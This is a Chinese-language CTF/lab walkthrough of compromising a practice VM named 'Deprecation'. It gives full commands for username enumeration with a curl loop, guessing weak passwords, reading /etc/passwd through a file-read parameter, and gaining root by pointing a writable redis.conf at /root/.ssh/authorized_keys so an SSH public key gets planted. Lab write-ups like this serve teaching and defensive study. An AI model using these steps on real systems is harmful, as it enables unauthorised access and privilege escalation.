# 信息收集

先用 arp-scan 扫一下本地网段，确定了靶机 IP 为 192.168.205.145。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
[sudo] password for kali:                                          
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.145 08:00:27:b3:9d:02       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ef:a8:26       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.016 seconds (126.98 hosts/sec). 4 responded
```

拿到 IP 后直接跑 Nmap 全端口扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p 0-65535 192.168.205.145
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 06:47 -0500
Nmap scan report for 192.168.205.145
Host is up (0.00089s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B3:9D:02 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.02 seconds
```

探测到只开了 22 和 80 端口，没什么花里胡哨的服务，突破口基本就在 80 端口的 Web 服务上了。

# Web 突破与意外解

访问 80 端口是一个登录页。我随便输了几个账号测试，发现如果用户名不存在，页面会明确提示“用户名不存在”。这就给了我们枚举用户名的空间，我直接用 curl 配合字典写了个简单的 bash 循环跑了一下。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ while read n;do curl -s -d "action=login&username=$n&password=x" http://192.168.205.145/ |grep -q "用户名不存在"||echo "$n";done<cirt-default-usernames.txt 
admin
guest
test
```

成功爆破出 admin、guest 和 test 三个有效用户名。本来准备继续爆破密码，结果随手试了下 `guest:guest123`，居然直接登进去了。

事后复盘发现这里其实有个预期解：靶机上留存了一个废弃的 `reg.php` 注册接口，利用这个接口注册时，如果输入的密码是正确的，系统会提示“这个密码已被系统占用，无法注册”。通过这个没有频率限制的接口，其实是可以验证密码的。

# 任意文件读取与 SSH 登录

进后台之后，留意到 URL 中有一个 `?view=filename` 的传参，这明显存在文件读取的问题。尝试读了一下私钥没找到，但读 `/etc/passwd` 时拿到了关键信息。

```text
...
shanran:x:1000:1000:shan******:/home/shanran:/bin/sh
...
```

注意到 `shanran` 这个用户的描述字段写着 `shan******`，这显然是个密码提示。结合前面的弱口令套路，盲猜密码是 `shanran123`，直接去连 SSH。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh shanran@192.168.205.145
shanran@192.168.205.145's password: 
...
Deprecation:~$ id
uid=1000(shanran) gid=1000(shanran) groups=104(redis),1000(shanran)
Deprecation:~$ sudo -l
Matching Defaults entries for shanran on Deprecation:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for shanran:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User shanran may run the following commands on Deprecation:
    (ALL) NOPASSWD: /sbin/rc-service redis restart
    (ALL) NOPASSWD: /sbin/rc-service redis stop
    (ALL) NOPASSWD: /sbin/rc-service redis start
    (ALL) NOPASSWD: /sbin/rc-service redis status
```

成功拿到初始 shell。查了下 sudo 权限，发现当前用户可以无密码重启和启停 redis 服务，并且当前用户属于 redis 组。

# Redis 配置劫持提权

看到能控 redis 并且有密码，基本确认是常规的 redis 提权套路了。顺手看了一眼 `/etc/redis.conf` 的权限配置。

```bash
Deprecation:~$ ls -la /etc/redis.conf
-rw-rw-r--    1 root     redis          325 Jan 30 22:27 /etc/redis.conf
```

配置文件对 `redis` 组是可写的，这就好办了。直接用 vim 编辑这个文件，把数据目录指向 root 的 ssh 目录，文件名改成公钥文件。

```bash
Deprecation:~$ vim /etc/redis.conf 
Deprecation:~$ cat /etc/redis.conf 
...
requirepass mypassword123
rename-command FLUSHALL ""

dir /root/.ssh
dbfilename authorized_keys
save 900 1
save 300 10
save 60 10000
```

配置修改完毕后，用 sudo 重启 redis 让配置生效，然后准备写入公钥。

这里有一个实战中常踩的坑：Redis 保存的 `dump.rdb` 包含二进制头部数据，如果直接写进文件，会破坏 `authorized_keys` 的解析格式导致 SSH 拒绝连接。解决办法是在写入的公钥前后加上几个换行符进行包裹。

```bash
Deprecation:~$ sudo /sbin/rc-service redis restart
 * Stopping redis ...                                                                                                                                                       [ ok ]
 * Starting redis ...
Deprecation:~$ echo -e "\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnpPlGDLyjGkyXBGeTKaRc75+aZub2aOXI8yD+mFadI kali@kali\n\n\n"|redis-cli -a mypassword123 -x set x
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
Deprecation:~$ redis-cli -a mypassword123 save
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
```

利用 `redis-cli -x` 将带有换行符的公钥作为变量 `x` 的值写入内存，随后执行 `save` 强制数据落盘到 `/root/.ssh/authorized_keys`。

# 权限获取与验证

数据落盘后，直接在 Kali 这边拿着对应的私钥尝试 SSH 登录 root 账号。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh root@192.168.205.145 -i ~/.ssh/id_ed25519
              _                        
__      _____| | ___ ___  _ __ ___   ___ 
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
                                       
Deprecation:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
Deprecation:~# cat /root/root.txt /home/shanran/user.txt 
flag{root-f7e6e45158d24a55e264ef05795c7248}
flag{user-0374e740474ae0e861460e5baf5ce293}
```

顺利切入 root 权限，读取 user 和 root 两个 flag，验证完成。